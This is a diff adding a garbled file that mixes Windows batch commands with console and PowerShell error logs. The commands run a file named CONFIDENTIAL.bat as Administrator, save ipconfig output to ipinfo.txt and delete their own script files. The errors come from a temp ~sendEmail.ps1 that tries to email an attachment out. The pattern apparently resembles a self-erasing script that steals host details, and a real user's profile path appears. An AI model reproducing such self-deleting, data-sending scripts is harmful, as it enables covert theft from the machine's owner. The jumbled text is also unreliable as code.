@@ -1,0 +1,41 @@
+runas /user:Administrator CONFIDENTIAL.bat
+
+IF EXIST "%PShellScript%" DEL /Q /F "%PShellScript%"
+
+IF EXIST "%~FN0" DEL /Q /F "%~FN0"
+
+
+C:\Users\gabby.clemente\Desktop>ipconfig  1>ipinfo.txt
+The process cannot access the file because it is being used by another process.
+The process cannot access the file because it is being used by another process.
+The process cannot access the file because it is being used by another process.
+The process cannot access the file because it is being used by another process.
+The process cannot access the file because it is being used by another process.
+The process cannot access the file because it is being used by another process.
+The process cannot access the file because it is being used by another process.
+The process cannot access the file because it is being used by another process.
+The process cannot access the file because it is being used by another process.
+The system cannot find the path specified.
+$SMTPClient.Send($SMTPMessage)
+The filename, directory name, or volume label syntax is incorrect.
+At C:\Users\gabby.clemente\AppData\Local\Temp\~sendEmail.ps1:16 char:92
+
+
+
+New-Object : A constructor was not found. Cannot find an appropriate constructor for type System.Net.Mail.Attachment.
+At C:\Users\gabby.clemente\AppData\Local\Temp\~sendEmail.ps1:11 char:16
++ $Attachment  = New-Object System.Net.Mail.Attachment($Attachment)
++                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (:) [New-Object], PSArgumentException
+    + FullyQualifiedErrorId : CannotFindAppropriateCtor,Microsoft.PowerShell.Commands.NewObjectCommand
+
+Exception calling "Add" with "1" argument(s): "Value cannot be null.
+Parameter name: item"
+At C:\Users\gabby.clemente\AppData\Local\Temp\~sendEmail.ps1:12 char:1
++ $SMTPMessage.Attachments.Add($Attachment)
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : ArgumentNullException
+
+IF EXIST "%PShellScript%" DEL /Q /F "%PShellScript%"
+
